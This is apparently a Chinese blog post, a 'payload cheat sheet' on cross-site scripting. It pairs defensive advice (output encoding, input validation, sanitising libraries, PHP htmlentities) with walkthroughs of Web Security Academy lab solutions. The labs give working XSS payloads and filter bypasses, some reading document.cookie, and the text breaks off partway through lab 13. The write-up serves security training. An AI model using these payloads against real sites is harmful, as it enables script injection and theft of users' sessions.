<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="payload备忘单, blogs,互联网,测试,大数据,生活,记录">
    <meta name="description" content="payload备忘单将输出数据编码处理在用户输入写入页面之前就应该执行编码操作，而且不同的上下文，编码方式不同，比如上下文为HTML时
&amp;lt; 编码成 &amp;amp;lt;
&gt; 编码成 &amp;amp;gt;

上下文为JS时
&amp;lt; 编码成 \">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>payload备忘单 | 读序</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 5.4.1">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="读序" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">读序</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">

      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/archives">
          
          <i class="fas fa-hourglass-half" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>时轴</span>
        </a>
      </li>
      
      <li>
        <a href="/pdf">
          
          <i class="fas fa-file-pdf" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>PDF</span>
        </a>
      </li>
      
      <li>
        <a href="/sql">
          
          <i class="fas fa-database" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>SQL</span>
        </a>
      </li>
      
      <li>
        <a href="/desktop">
          
          <i class="fas fa-desktop" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Desktop</span>
        </a>
      </li>
      
      <li>
        <a href="/duxu-dailylife">
          
          <i class="fas fa-pen" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>blog</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/books" class="waves-effect waves-light">

      
      <i class="fas fa-list" style="zoom: 0.6;"></i>
      
      <span>Medias</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/musics">
          
          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>musics</span>
        </a>
      </li>
      
      <li>
        <a href="/books">
          
          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>books</span>
        </a>
      </li>
      
      <li>
        <a href="/videos">
          
          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>videos</span>
        </a>
      </li>
      
      <li>
        <a href="/galleries">
          
          <i class="fas fa-image" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>galleries</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">读序</div>
        <div class="logo-desc">
            
            我们每一个人都因为生存而充满焦虑，我们真实的存在被不真实的存在所笼罩。而实际上，真正的我们并不会受到不真实存在的威胁。
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-archive"></i>
			
			归档
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/archives " style="margin-left:50px">
				  
				   <i class="fa fas fa-hourglass-half" style="position: absolute;left:28px" ></i>
			      
		          <span>时轴</span>
                  </a>
                </li>
              
                <li>

                  <a href="/pdf " style="margin-left:50px">
				  
				   <i class="fa fas fa-file-pdf" style="position: absolute;left:28px" ></i>
			      
		          <span>PDF</span>
                  </a>
                </li>
              
                <li>

                  <a href="/sql " style="margin-left:50px">
				  
				   <i class="fa fas fa-database" style="position: absolute;left:28px" ></i>
			      
		          <span>SQL</span>
                  </a>
                </li>
              
                <li>

                  <a href="/desktop " style="margin-left:50px">
				  
				   <i class="fa fas fa-desktop" style="position: absolute;left:28px" ></i>
			      
		          <span>Desktop</span>
                  </a>
                </li>
              
                <li>

                  <a href="/duxu-dailylife " style="margin-left:50px">
				  
				   <i class="fa fas fa-pen" style="position: absolute;left:28px" ></i>
			      
		          <span>blog</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-list"></i>
			
			Medias
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/musics " style="margin-left:50px">
				  
				   <i class="fa fas fa-music" style="position: absolute;left:28px" ></i>
			      
		          <span>musics</span>
                  </a>
                </li>
              
                <li>

                  <a href="/books " style="margin-left:50px">
				  
				   <i class="fa fas fa-book" style="position: absolute;left:28px" ></i>
			      
		          <span>books</span>
                  </a>
                </li>
              
                <li>

                  <a href="/videos " style="margin-left:50px">
				  
				   <i class="fa fas fa-film" style="position: absolute;left:28px" ></i>
			      
		          <span>videos</span>
                  </a>
                </li>
              
                <li>

                  <a href="/galleries " style="margin-left:50px">
				  
				   <i class="fa fas fa-image" style="position: absolute;left:28px" ></i>
			      
		          <span>galleries</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/bigworldxld/bigworldxld.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/bigworldxld/bigworldxld.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请使用开启大门的钥匙')).toString(CryptoJS.enc.Hex)) {
                alert('密钥错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/images/js%E5%89%8D%E7%AB%AF.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">payload备忘单</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/js/">
                                <span class="chip bg-color">js</span>
                            </a>
                        
                            <a href="/tags/html/">
                                <span class="chip bg-color">html</span>
                            </a>
                        
                            <a href="/tags/csrf/">
                                <span class="chip bg-color">csrf</span>
                            </a>
                        
                            <a href="/tags/csp/">
                                <span class="chip bg-color">csp</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/front-end/" class="post-category">
                                front-end
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-09-21
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    4.1k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    18 分
                </div>
                

                
				
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
				

            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="payload备忘单"><a href="#payload备忘单" class="headerlink" title="payload备忘单"></a>payload备忘单</h2><h3 id="将输出数据编码处理"><a href="#将输出数据编码处理" class="headerlink" title="将输出数据编码处理"></a>将输出数据编码处理</h3><p>在用户输入写入页面之前就应该执行编码操作，而且不同的上下文，编码方式不同，比如上下文为HTML时</p>
<pre class=" language-xml"><code class="language-xml">&lt; 编码成 <span class="token entity" title="&lt;">&amp;lt;</span>
> 编码成 <span class="token entity" title="&gt;">&amp;gt;</span>
</code></pre>
<p>上下文为JS时</p>
<pre class=" language-markdown"><code class="language-markdown">&lt; 编码成 \u003c
<span class="token blockquote punctuation">></span> 编码成 \u003e
</code></pre>
<p>有的时候还需要按顺序进行多层编码处理以防止出现像onclick事件的情况。</p>
<h3 id="验证输入"><a href="#验证输入" class="headerlink" title="验证输入"></a>验证输入</h3><p>需要尽量严格地验证输入，比如采取这样的措施</p>
<ul>
<li>如果响应会返回提交的URL，则验证是不是HTTP或HTTPS开头的</li>
<li>如果预期输入是数字，则验证输入是否为整数</li>
<li>验证输入中包含的字符是否均为允许的字符</li>
</ul>
<h3 id="白名单还是黑名单"><a href="#白名单还是黑名单" class="headerlink" title="白名单还是黑名单"></a>白名单还是黑名单</h3><p>一般情况下都会选择白名单，因为如果使用黑名单的话，永远不知道有没有遗漏，俗话说，宁可错杀一千不放过一个嘛。</p>
<h3 id="允许安全的HTML"><a href="#允许安全的HTML" class="headerlink" title="允许安全的HTML"></a>允许安全的HTML</h3><p>应尽可能地限制使用HTML标记，应该过滤到有害的标签和JS，也可以引入一些执行过滤和编码的JS库，如DOMPurify。有些库还允许用户使用markdown来编写内容再渲染成HTML，但是这些库都不是绝对的安全，所以要及时更新。</p>
<h3 id="如何使用模板引擎缓解"><a href="#如何使用模板引擎缓解" class="headerlink" title="如何使用模板引擎缓解"></a>如何使用模板引擎缓解</h3><p>有些网站使用Twig和Freemarker等服务器端模板引擎在HTML中嵌入动态内容，他们都有自己的过滤器，还有一些引擎，比如Jinja和React，它们默认情况下就会转义动态内容，一定程度上也会缓解XSS攻击。</p>
<h3 id="如何在PHP中缓解XSS"><a href="#如何在PHP中缓解XSS" class="headerlink" title="如何在PHP中缓解XSS"></a>如何在PHP中缓解XSS</h3><p>可以利用内置的HTML编码函数htmlentities，它有三个参数分别为</p>
<ul>
<li>输入字符串</li>
<li>ENT_QUOTES，编码所有引号标志</li>
<li>字符集，一般为UTF-8</li>
</ul>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p><strong>BurpSuite-Lab</strong><br>1:将 存储XSS 到 HTML 上下文中，不编码任何内容</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
</code></pre>
<p>2: DOM XSS使用 source 的 sink 中的中的 document.location.search<br>f12查看sources中对应的内容<br>备注：由于在hexo中，会索引到img src=”图片路径”，则都需要用`到代替”</p>
<pre class=" language-js"><code class="language-js"> <span class="token keyword">function</span> <span class="token function">trackSearch</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>'<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token template-string"><span class="token string">`/resources/images/tracker.gif?searchTerms='+query+'`</span></span><span class="token operator">></span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token template-string"><span class="token string">`/resources/images/tracker.gif`</span></span><span class="token operator">?</span>searchTerms<span class="token operator">=</span><span class="token string">'+`>&lt;svg onload=alert(1)>+'</span>"<span class="token operator">></span>
</code></pre>
<p>输入query为：</p>
<pre class=" language-js"><code class="language-js">"<span class="token operator">></span><span class="token operator">&lt;</span>svg onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span>
</code></pre>
<p>3: DOM XSS使用源的 jQuery 锚点属性接收器中的 href属性location.search<br>将url的/改为javascript:alert(document.cookie)<br><a target="_blank" rel="noopener" href="https://0ad9001d035f473b80f13a8200ab00af.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)">https://0ad9001d035f473b80f13a8200ab00af.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)</a><br>4：DOM XSS使用 hashchange 事件的 jQuery 选择器接收器<br>在exploit server上，body中输入</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"https://YOUR-LAB-ID.web-security-academy.net/#"</span> onload<span class="token operator">=</span><span class="token string">"this.src+='&lt;img src=x onerror=print()>'"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span>
</code></pre>
<p>并推送到服务器，会出现打印弹窗<br>5：将反射XSS 到带有尖括号 HTML 编码的属性中</p>
<p>搜索框输入</p>
<pre class=" language-js"><code class="language-js"><span class="token string">"onmouseover="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre>
<p>当鼠标移动到上面会打印1<br>6：将存储XSS 到带有双引号 HTML 编码的锚点属性中href</p>
<p>添加评论信息，post请求体如下：</p>
<pre class=" language-js"><code class="language-js">csrf<span class="token operator">=</span>j0OvPoGjDV3Hdu6pubtZJhSHiI2Kyf3U<span class="token operator">&amp;</span>postId<span class="token operator">=</span><span class="token number">8</span><span class="token operator">&amp;</span>comment<span class="token operator">=</span>a<span class="token operator">&amp;</span>name<span class="token operator">=</span>a<span class="token operator">&amp;</span>email<span class="token operator">=</span>a<span class="token operator">%</span>40qq<span class="token punctuation">.</span>com<span class="token operator">&amp;</span>website<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre>
<p>点击name为a的会弹出弹窗打印1<br>7：将反射XSS 为带有尖括号 HTML 编码的 JavaScript 字符串<br>f12查看sources中对应的内容</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>
 <span class="token keyword">var</span> searchTerms <span class="token operator">=</span> <span class="token string">'sss'</span><span class="token punctuation">;</span>
 document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>'<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token template-string"><span class="token string">`/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'`</span></span><span class="token operator">></span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token template-string"><span class="token string">`/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'`</span></span><span class="token operator">></span>
</code></pre>
<pre class=" language-js"><code class="language-js">GET <span class="token operator">/</span><span class="token operator">?</span>search<span class="token operator">=</span><span class="token string">'-alert(123)-'</span>
</code></pre>
<p>8：DOM XSS在document.write sink，使用源代码位置在select元素内搜索</p>
<pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> stores <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"London"</span><span class="token punctuation">,</span><span class="token string">"Paris"</span><span class="token punctuation">,</span><span class="token string">"Milan"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> store <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'storeId'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;select name="storeId">'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token keyword">if</span><span class="token punctuation">(</span>store<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;option selected>'</span><span class="token operator">+</span>store<span class="token operator">+</span><span class="token string">'&lt;/option>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">}</span>
</code></pre>
<p>在url中添加</p>
<pre class=" language-js"><code class="language-js">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>0a810071039aa59780d24e4b002300ec<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span>product<span class="token operator">?</span>product<span class="token operator">?</span>productId<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>storeId<span class="token operator">=</span>London<span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span><span class="token operator">&lt;</span>img<span class="token operator">%</span>20src<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>20onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span>
</code></pre>
<p>9：AngularJS 表达式中的 DOM XSS，带有尖括号和双引号 HTML 编码<br>搜索框输入：</p>
<pre class=" language-js"><code class="language-js"><span class="token punctuation">{</span><span class="token punctuation">{</span>$on<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">'alert(1)'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre>
<p>10：反射型 DOM XSS<br>搜索框输入：</p>
<pre class=" language-js"><code class="language-js">\"<span class="token operator">-</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//</span>
</code></pre>
<p>分析：<br>搜索框输入：<br>11111<br>f12在xhr中，获取搜索接口，响应返回的json数据</p>
<pre class=" language-js"><code class="language-js"><span class="token punctuation">{</span><span class="token string">"results"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"searchTerm"</span><span class="token punctuation">:</span><span class="token string">"11111"</span><span class="token punctuation">}</span>
</code></pre>
<p>由于您已注入反斜杠并且站点未转义它们，因此当 JSON 响应尝试转义左双引号字符时，它会添加第二个反斜杠。生成的双反斜杠会导致转义被有效地抵消。这意味着双引号以未转义的方式处理，这将关闭应包含搜索词的字符串。</p>
<p>然后，在调用函数之前，使用算术运算符（在本例中为减法运算符）分隔表达式。最后，一个右大括号和两个正斜杠提前结束 JSON 对象，并注释掉对象的其余部分。因此，将生成如下响应：alert()</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"results"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"searchTerm"</span><span class="token operator">:</span><span class="token string">"\\"</span>-alert(<span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span>//"<span class="token punctuation">}</span>
</code></pre>
<p>10：存储的 DOM XSS<br>为了防止 XSS，该网站使用 JavaScript replace()函数对尖括号进行编码。但是，当第一个参数是字符串时，该函数仅替换第一个出现的参数。我们通过在评论的开头添加一组额外的尖括号来利用此漏洞。这些尖括号将被编码，但任何后续尖括号都不会受到影响，这使我们能够有效地绕过过滤器并注入 HTML。<br>博客评论区输入：</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span>
</code></pre>
<p>11：将反射XSS到 HTML 上下文中，但大多数标记和属性被阻止</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>body onresize<span class="token operator">=</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>
</code></pre>
<p>由于抓包中的搜索请求http/2的，则在Exploit Server中，需要也是http/2<br>以下body的payload字符串经过Unicode</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"https://0a50008303e28dba83b1e64700f6000b.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"</span> onload<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token string">'100px'</span><span class="token operator">></span>
</code></pre>
<p>12:将反射XSS 到 HTML 上下文中，并阻止除自定义标记之外的所有标记<br>&lt;xss+id=x+onfocus=alert(document.cookie) tabindex=1&gt;#x’<br>由于抓包中的搜索请求http/2的，则在Exploit Server中，需要也是http/2<br>以下body的payload字符串经过encodeURI</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>
location <span class="token operator">=</span> <span class="token string">'https://0a9a00b903f99be184fc8113004b0072.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
</code></pre>
<p>13：允许使用一些 SVG 标记的反射型 XSS<br>(1)注入标准 XSS 有效负载，例如：</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span>
</code></pre>
